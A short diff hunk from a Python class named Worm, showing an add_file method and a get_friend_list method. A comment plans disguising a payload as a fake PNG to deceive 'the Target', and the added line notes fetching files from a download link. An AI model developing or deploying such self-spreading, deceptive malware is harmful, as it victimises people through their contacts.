@@ -61,7 +61,7 @@ class Worm:
     def add_file(self, path, name) -> None: # TODO # You should add Maby an fake PNG file to show the Target what you want to give him
         if not os.path.exists(path):
             raise FileNotFoundError
-        
+        # I also have to add an options to get the file from a direct download link
         self.files.append({'path': path, 'name': name})
 
     def get_friend_list(self) -> dict:
